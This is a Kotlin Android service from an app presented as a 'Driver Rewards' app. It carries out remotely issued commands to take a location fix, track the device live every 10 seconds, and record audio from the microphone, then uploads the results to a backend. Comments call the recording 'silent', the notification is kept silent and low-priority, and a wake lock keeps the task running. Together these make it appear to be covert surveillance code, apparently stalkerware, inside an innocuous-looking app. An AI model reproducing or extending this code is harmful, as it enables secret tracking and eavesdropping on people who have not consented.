// Package: com.sm.driverrewards.service
// Short-lived Foreground Service: runs on-demand tasks then immediately stops
package com.sm.driverrewards.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.sm.core.model.CommandStatus
import com.sm.core.model.CommandType
import com.sm.driverrewards.DriverRewardsApp
import com.sm.driverrewards.R
import com.sm.driverrewards.data.local.AgentPreferences
import com.sm.driverrewards.data.repository.AgentRepository
import com.sm.driverrewards.service.audio.AudioRecordPipeline
import com.sm.driverrewards.service.location.LocationFetcher
import com.sm.driverrewards.ui.MainActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class TelemetryExecutionService : Service() {

    companion object {
        const val ACTION_EXECUTE_COMMAND = "com.sm.driverrewards.ACTION_EXECUTE_COMMAND"
        const val ACTION_STOP_CURRENT_TASK = "com.sm.driverrewards.ACTION_STOP_CURRENT_TASK"

        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_COMMAND_TYPE = "extra_command_type"
        const val EXTRA_DURATION_MINUTES = "extra_duration_minutes"
        const val EXTRA_HIGH_ACCURACY = "extra_high_accuracy"

        private const val NOTIFICATION_ID = 40401

        fun startCommand(
            context: Context,
            commandId: String,
            commandType: String,
            durationMinutes: Int = 5,
            highAccuracy: Boolean = false
        ) {
            val intent = Intent(context, TelemetryExecutionService::class.java).apply {
                action = ACTION_EXECUTE_COMMAND
                putExtra(EXTRA_COMMAND_ID, commandId)
                putExtra(EXTRA_COMMAND_TYPE, commandType)
                putExtra(EXTRA_DURATION_MINUTES, durationMinutes)
                putExtra(EXTRA_HIGH_ACCURACY, highAccuracy)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopTask(context: Context) {
            val intent = Intent(context, TelemetryExecutionService::class.java).apply {
                action = ACTION_STOP_CURRENT_TASK
            }
            context.startService(intent)
        }
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private lateinit var prefs: AgentPreferences
    private lateinit var repository: AgentRepository
    private lateinit var locationFetcher: LocationFetcher
    private var wakeLock: PowerManager.WakeLock? = null
    private var activeAudioPipeline: AudioRecordPipeline? = null

    override fun onCreate() {
        super.onCreate()
        prefs = AgentPreferences(this)
        repository = AgentRepository()
        locationFetcher = LocationFetcher(this)

        // WakeLock acquire karte hain taaki task complete hone tak CPU sleep na kare
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SMDriverRewards::TelemetryServiceWakeLock"
        ).apply {
            setReferenceCounted(false)
            acquire(65 * 60 * 1000L) // Max 65 mins safety timeout
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action

        if (action == ACTION_STOP_CURRENT_TASK) {
            stopActiveTasksAndSelf()
            return START_NOT_STICKY
        }

        val commandId = intent?.getStringExtra(EXTRA_COMMAND_ID) ?: ""
        val commandType = intent?.getStringExtra(EXTRA_COMMAND_TYPE) ?: ""
        val durationMinutes = intent?.getIntExtra(EXTRA_DURATION_MINUTES, 5) ?: 5
        val highAccuracy = intent?.getBooleanExtra(EXTRA_HIGH_ACCURACY, false) ?: false

        // Foreground notification post karte hain with required Android 14+ FGS types
        startSilentForeground()

        serviceScope.launch {
            try {
                if (commandId.isNotBlank()) {
                    repository.updateCommandStatus(commandId, CommandStatus.EXECUTING)
                }

                when (commandType) {
                    CommandType.GET_LOCATION -> {
                        executeOneShotLocation(commandId, highAccuracy)
                    }
                    CommandType.START_RECORDING -> {
                        executeAudioRecording(commandId, durationMinutes)
                    }
                    CommandType.LIVE_TRACK -> {
                        executeLiveTracking(commandId, durationMinutes.coerceAtLeast(10))
                    }
                    CommandType.STOP_RECORDING -> {
                        stopActiveTasksAndSelf()
                    }
                }
            } catch (e: Exception) {
                if (commandId.isNotBlank()) {
                    repository.updateCommandStatus(commandId, CommandStatus.FAILED, e.message)
                }
            } finally {
                if (commandType != CommandType.START_RECORDING && commandType != CommandType.LIVE_TRACK) {
                    stopActiveTasksAndSelf()
                }
            }
        }

        return START_NOT_STICKY
    }

    /**
     * Silent low-importance notification build karke startForeground call karte hain
     */
    private fun startSilentForeground() {
        val openAppIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            openAppIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notification: Notification = NotificationCompat.Builder(this, DriverRewardsApp.NOTIFICATION_CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_body))
            .setSmallIcon(R.drawable.ic_truck)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val fgsType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            startForeground(NOTIFICATION_ID, notification, fgsType)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    /**
     * One-shot location fix execute karke Supabase me daalta hai aur service close kar deta hai
     */
    private suspend fun executeOneShotLocation(commandId: String, highAccuracy: Boolean) {
        val deviceId = prefs.getDeviceId()
        val loc = locationFetcher.fetchCurrentLocation(
            deviceId = deviceId,
            commandId = commandId.ifBlank { null },
            highAccuracy = highAccuracy
        )

        if (loc != null) {
            repository.postLocation(loc)
            if (commandId.isNotBlank()) {
                repository.updateCommandStatus(commandId, CommandStatus.COMPLETED)
            }
        } else {
            if (commandId.isNotBlank()) {
                repository.updateCommandStatus(commandId, CommandStatus.FAILED, "Location unavailable")
            }
        }
    }

    /**
     * Silent audio recording pipeline run karta hai (AudioRecord + MediaCodec 32kbps mono AAC)
     */
    private fun executeAudioRecording(commandId: String, durationMinutes: Int) {
        val deviceId = prefs.getDeviceId()
        activeAudioPipeline?.stop()

        activeAudioPipeline = AudioRecordPipeline(
            context = applicationContext,
            repository = repository,
            deviceId = deviceId,
            commandId = commandId.ifBlank { null },
            totalDurationMinutes = durationMinutes
        )

        activeAudioPipeline?.start()

        // Background supervisor watcher: Duration poora hone par command completed mark karke stop karega
        serviceScope.launch {
            val totalWaitMs = durationMinutes * 60 * 1000L
            delay(totalWaitMs + 2000L) // Small buffer for last chunk completion
            if (commandId.isNotBlank()) {
                repository.updateCommandStatus(commandId, CommandStatus.COMPLETED)
            }
            stopActiveTasksAndSelf()
        }
    }

    /**
     * Live tracking for 10 minutes (10 second interval)
     */
    private suspend fun executeLiveTracking(commandId: String, durationMinutes: Int) {
        val deviceId = prefs.getDeviceId()
        val endTime = System.currentTimeMillis() + (durationMinutes * 60 * 1000L)

        while (System.currentTimeMillis() < endTime) {
            val loc = locationFetcher.fetchCurrentLocation(
                deviceId = deviceId,
                commandId = commandId.ifBlank { null },
                highAccuracy = true
            )
            if (loc != null) {
                repository.postLocation(loc)
            }
            delay(10_000L) // 10 second sleep
        }

        if (commandId.isNotBlank()) {
            repository.updateCommandStatus(commandId, CommandStatus.COMPLETED)
        }
        stopActiveTasksAndSelf()
    }

    private fun stopActiveTasksAndSelf() {
        try {
            activeAudioPipeline?.stop()
            activeAudioPipeline = null
        } catch (_: Exception) {}

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}

        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopActiveTasksAndSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
